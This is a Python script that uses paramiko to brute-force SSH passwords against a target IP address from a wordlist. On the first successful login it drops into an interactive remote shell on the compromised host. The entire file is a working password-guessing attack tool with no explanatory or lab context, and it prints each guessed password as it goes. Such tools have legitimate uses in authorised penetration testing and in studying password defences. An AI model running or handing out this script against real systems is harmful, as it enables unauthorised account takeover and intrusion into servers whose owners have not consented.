import paramiko
import sys
import os
import socket
from termcolor import colored
import time

def ssh_connect(password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password, timeout=3)
        return ssh, 0
    except paramiko.AuthenticationException:
        return None, 1
    except paramiko.SSHException as e:
        print(f'SSH Error: {e}')
        return None, 3
    except socket.error as e:
        print(f'Socket Error: {e}')
        return None, 2
    except Exception as e:
        print(f'Exception: {e}')
        return None, 3

def interactive_shell(ssh):
    try:
        shell = ssh.invoke_shell()
        print(colored('[*] Interactive SSH session established', 'green'))

        while True:
            command = input(f'{username}@{host}:~$ ')
            if command.lower() in ['exit', 'quit']:
                break
            shell.send(command + '\n')
            time.sleep(1)  # Wait for the command to execute
            output = shell.recv(65535)
            print(output.decode())
    except Exception as e:
        print(f'Exception during interactive session: {e}')
    finally:
        ssh.close()
        print(colored('[*] SSH session closed', 'yellow'))

host = input('[+] Enter target IP address: ')
username = input('[+] Enter username for the target: ')
input_file = input('[+] Enter passwords file: ')

if not os.path.exists(input_file):
    print('[-] The file specified does not exist.')
    sys.exit(1)

with open(input_file, 'r') as file:
    print(colored('\n' + '[+] Checking passwords for ' + username + '@' + host + '\n','cyan'))
    for line in file.readlines():
        password = line.strip()
        try:
            ssh, response = ssh_connect(password)
            if response == 0:
                print(colored('\n' + '[+] Found password ' + password + ' for username ' + username, 'green'))
                interactive_shell(ssh)
                break
            elif response == 1:
               # pass
                print(colored('[-] Incorrect password: ' + password, 'red'))
            elif response == 2:
                print(colored('[-] Connection to ' + host + ' failed', 'yellow'))
                sys.exit(1)
            elif response == 3:
                print(colored('[-] An unexpected error occurred', 'yellow'))
        except EOFError:
            print(colored('[-] EOFError: Error reading SSH protocol banner', 'yellow'))
        except Exception as e:
            print(e)
            pass
